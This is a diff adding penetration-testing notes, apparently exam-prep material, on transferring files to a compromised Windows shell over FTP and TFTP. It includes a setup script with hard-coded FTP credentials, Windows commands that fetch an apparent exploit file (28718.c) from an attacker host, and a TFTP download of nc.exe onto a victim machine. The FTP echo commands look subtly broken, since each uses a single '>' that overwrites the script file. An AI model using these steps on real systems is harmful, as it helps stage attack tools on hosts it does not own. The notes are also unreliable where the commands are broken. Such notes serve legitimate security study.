@@ -1,0 +1,45 @@
+FTP
+(For Non-interactive shell)
+	Quickly Installing pure-ftp server in kali with user credentials as offsec:tornado1 and uploading file in the directory
+	setup-ftp.sh
+		#!/bin/bash
+		groupadd ftpgroup
+		useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+		pure-pw useradd offsec -u ftpuser -d /ftphome
+		pure-pw mkdb
+		cd /etc/pure-ftpd/auth/
+		ln -s ../conf/PureDB 60pdb
+		mkdir -p /ftphome
+		chown -R ftpuser:ftpgroup /ftphome/
+		/etc/init.d/pure-ftpd restart
+		
+	#chmod	755 setup-ftp.sh
+	./setup-ftp.sh
+	
+	With our FTP server configured, we can now paste the following commands into a
+	remote Windows shell and download files over FTP non-interactively.
+	
+	In windows shell:
+	> echo open 10.11.0.154 21 > ftp.txt		#connect to ip and port where ftp server is running	
+	> echo user offsec tornado1> ftp.txt		#credentials to connect
+	> echo ascii> ftp.txt						# how to connect ascii(text) or binary (for executables)
+	> echo get 28718.c> ftp.txt				#download the file
+	> echo bye>ftp.txt						#end of file
+	
+	>ftp -v -n -s:ftp.txt
+	
+
+TFTP
+	Windows operating systems up to Windows XP and 2003 contain a TFTP client, by default	
+	The big advantage of TFTP file transfers is that the tftp client can work non-interactively, making the file transfer easy.
+
+	Setup the TFTP server on Kali
+		root@kali:~#mkdir /tftp
+		root@kali:~# atftpd --daemon --port 69 /tftp
+		root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
+	
+	invoke the tftp client, on the Windows 7 box
+		C:\Users\Offsec>tftp -i 10.11.0.5 get nc.exe
+		
+		
+
